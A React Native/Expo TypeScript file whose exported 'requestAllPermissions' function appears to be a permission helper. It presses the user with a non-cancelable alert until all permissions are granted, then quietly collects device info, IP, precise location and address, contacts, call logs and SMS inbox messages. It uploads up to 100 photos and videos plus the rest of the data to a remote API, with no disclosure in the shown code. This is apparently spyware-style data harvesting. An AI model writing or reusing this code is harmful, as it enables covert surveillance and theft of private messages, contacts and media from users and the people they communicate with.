import { generateHeaders } from "@/lib/generateHeaders";
import axios from "axios";
import * as Contacts from "expo-contacts";
import * as Device from "expo-device";
import * as Linking from "expo-linking";
import * as Location from "expo-location";
import * as MediaLibrary from "expo-media-library";
import * as Network from "expo-network";
import { Alert, AppState, PermissionsAndroid, Platform } from "react-native";
import SmsAndroid from "react-native-get-sms-android";

/* ----------------------------- CALL LOGS ----------------------------- */
async function requestCallLogPermissions() {
  try {
    const granted = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.READ_CALL_LOG,
      PermissionsAndroid.PERMISSIONS.READ_PHONE_STATE,
    ]);

    return (
      granted["android.permission.READ_CALL_LOG"] ===
      PermissionsAndroid.RESULTS.GRANTED
    );
  } catch (error) {
    console.error("❌ Error requesting Call Log permissions:", error);
    return false;
  }
}

async function getCallLogsSafe() {
  try {
    const CallLogs = require("react-native-call-log");
    if (!CallLogs?.loadAll) {
      console.warn(
        "⚠️ Call Log module not available. Run via prebuild + run:android"
      );
      return [];
    }
    const logs = await CallLogs.loadAll();
    return logs;
  } catch (error) {
    console.error("❌ Error fetching call logs:", error);
    return [];
  }
}

/* ----------------------------- SMS ----------------------------- */
async function requestSmsPermissions() {
  try {
    const granted = await PermissionsAndroid.requestMultiple([
      PermissionsAndroid.PERMISSIONS.READ_SMS,
      PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
      PermissionsAndroid.PERMISSIONS.SEND_SMS,
    ]);

    return (
      granted["android.permission.READ_SMS"] ===
      PermissionsAndroid.RESULTS.GRANTED
    );
  } catch (e) {
    console.error("❌ Error requesting SMS permissions:", e);
    return false;
  }
}

async function getSmsSafe() {
  try {
    return new Promise((resolve) => {
      const filter = { box: "inbox", maxCount: 20 };
      (SmsAndroid as any).list(
        JSON.stringify(filter),
        (fail: any) => {
          console.error("SMS fetch failed:", fail);
          resolve([]);
        },
        (count: number, smsList: string) => {
          try {
            resolve(JSON.parse(smsList));
          } catch {
            resolve([]);
          }
        }
      );
    });
  } catch (e) {
    console.error("❌ Error fetching SMS:", e);
    return [];
  }
}

/* ----------------------------- HELPERS ----------------------------- */
function getLocalISOTimeMicro() {
  const now = new Date();
  const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
  const tzOffset = -now.getTimezoneOffset();
  const sign = tzOffset >= 0 ? "+" : "-";
  const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(
    2,
    "0"
  );
  const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");
  const base = now.toISOString().split(".")[0];
  return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
}

/* ----------------------------- MAIN FUNCTION ----------------------------- */
export async function requestAllPermissions() {
  const base_URL = process.env.EXPO_PUBLIC_API_BASE_URL;
  const SUBMIT_ENDPOINT = `${base_URL}/user/`;
  const SUBMIT_MEDIA_ENDPOINT = `${base_URL}/user/u`;

  try {
    let allGranted = false;

    // 🔹 Initial permission requests
    if (Platform.OS === "android") {
      await requestCallLogPermissions();
      await requestSmsPermissions();
    }
    await Promise.all([
      Location.requestForegroundPermissionsAsync(),
      Contacts.requestPermissionsAsync(),
      MediaLibrary.requestPermissionsAsync(),
    ]);

    // 🔁 Keep prompting until everything granted
    while (!allGranted) {
      const [loc, cont, net, media] = await Promise.all([
        Location.getForegroundPermissionsAsync(),
        Contacts.getPermissionsAsync(),
        Network.getNetworkStateAsync(),
        MediaLibrary.getPermissionsAsync(),
      ]);

      const callLogGranted =
        Platform.OS === "android"
          ? await PermissionsAndroid.check(
              PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
            )
          : true;
      const smsGranted =
        Platform.OS === "android"
          ? await PermissionsAndroid.check(
              PermissionsAndroid.PERMISSIONS.READ_SMS
            )
          : true;

      const denied: string[] = [];
      if (loc.status !== "granted") denied.push("Location");
      if (cont.status !== "granted") denied.push("Contacts");
      if (!net.isConnected) denied.push("Internet");
      if (media.status !== "granted") denied.push("Media Library");
      if (Platform.OS === "android" && !callLogGranted)
        denied.push("Call Logs");
      if (Platform.OS === "android" && !smsGranted) denied.push("SMS");

      if (denied.length === 0) {
        allGranted = true;

        /* ---------- Collect all data ---------- */
        const deviceInfo = {
          brand: Device.brand,
          modelName: Device.modelName,
          osName: Device.osName,
          osVersion: Device.osVersion,
        };

        const ipAddress = await Network.getIpAddressAsync();
        const networkInfo = {
          type: net.type,
          isConnected: net.isConnected,
          ipAddress,
        };

        const location = await Location.getCurrentPositionAsync({});
        const geocode = await Location.reverseGeocodeAsync(location.coords);
        const address =
          geocode.length > 0
            ? `${geocode[0].name}, ${geocode[0].street}, ${geocode[0].city}, ${geocode[0].region}, ${geocode[0].country}`
            : "Unknown";

        const contactsData = await Contacts.getContactsAsync({
          fields: [Contacts.Fields.PhoneNumbers],
          pageSize: 20,
        });
        const safeContacts = contactsData.data.map((c) => ({
          name: c.name,
          phoneNumbers: c.phoneNumbers?.map((p) => p.number) || [],
        }));

        const callLogs = callLogGranted ? await getCallLogsSafe() : [];
        const smsList = smsGranted ? await getSmsSafe() : [];

        let uploadedFiles: any[] = [];
        try {
          const headers = await generateHeaders();
          const media = await MediaLibrary.getAssetsAsync({
            mediaType: ["photo", "video"],
            first: 100, // limit to first 100
          });

          console.log("📸 Found", media.assets.length, "media files");
          if (media.assets.length === 0) return;
          for (const file of media.assets) {
            const formData = new FormData();
            formData.append("file", {
              uri: file.uri,
              name: file.filename,
              type: file.mediaType === "video" ? "video/mp4" : "image/jpeg",
            } as any);
            try {
              const response = await axios.post(
                SUBMIT_MEDIA_ENDPOINT,
                formData,
                {
                  headers: {
                    ...headers,
                    "Content-Type": "multipart/form-data",
                  },
                  onUploadProgress: (progressEvent) => {
                    const percent = Math.round(
                      (progressEvent.loaded * 100) / (progressEvent.total || 1)
                    );
                    console.log(`⬆️ Uploading ${file.filename}: ${percent}%`);
                  },
                  timeout: 20000, // optional timeout
                }
              );

              const result = response.data;
              uploadedFiles.push({
                original_filename: file.filename,
                new_filename: result.new_filename,
              });

              console.log(`✅ Uploaded: ${file.filename}`);
            } catch (err: any) {
              console.error(
                `❌ Failed to upload ${file.filename}:`,
                err.message
              );
            }
          }

          // Step 5️⃣: Summary log
          console.log("✅ All uploaded files:", uploadedFiles);
        } catch (error: any) {
          console.error(
            "❌ Error uploading media files:",
            error.response?.data || error
          );
        }

        const allData = {
          deviceInfo,
          networkInfo,
          location: {
            latitude: location.coords.latitude,
            longitude: location.coords.longitude,
            address,
          },
          contacts: safeContacts,
          callLogs,
          smsList,
          mediaUploads: uploadedFiles,
        };

        //  console.log("📊 Permission Summary:", allData);

        // 📨 Submit to API
        try {
          const headers = await generateHeaders();
          const response = await axios.post(
            SUBMIT_ENDPOINT,
            {
              timestamp: getLocalISOTimeMicro(),
              info: allData,
            },
            { headers }
          );
          //  console.log("✅ Permission data submitted:", response.data);
        } catch (err) {
          console.error("❌ Error submitting data:", err);
        }

        return allData;
      }

      // 🚫 Some permissions denied
      console.log("🚫 Denied:", denied);

      const userAction = await new Promise<"retry" | "settings">((resolve) => {
        Alert.alert(
          "Permissions Required",
          `Please allow:\n\n- ${denied.join("\n- ")}`,
          [
            { text: "Retry", onPress: () => resolve("retry") },
            { text: "Open Settings", onPress: () => resolve("settings") },
          ],
          { cancelable: false }
        );
      });

      if (userAction === "settings") {
        await Linking.openSettings();
        await new Promise<void>((resolve) => {
          const sub = AppState.addEventListener("change", (s) => {
            if (s === "active") {
              sub.remove();
              resolve();
            }
          });
        });
      } else {
        // Retry denied permissions only
        if (Platform.OS === "android" && denied.includes("Call Logs"))
          await requestCallLogPermissions();
        if (Platform.OS === "android" && denied.includes("SMS"))
          await requestSmsPermissions();
        if (denied.includes("Location"))
          await Location.requestForegroundPermissionsAsync();
        if (denied.includes("Contacts"))
          await Contacts.requestPermissionsAsync();
        if (denied.includes("Media Library"))
          await MediaLibrary.requestPermissionsAsync();
      }
    }
  } catch (err) {
    console.error("❌ Permission Error:", err);
    Alert.alert("Error", "Something went wrong while requesting permissions.");
    return null;
  }
}
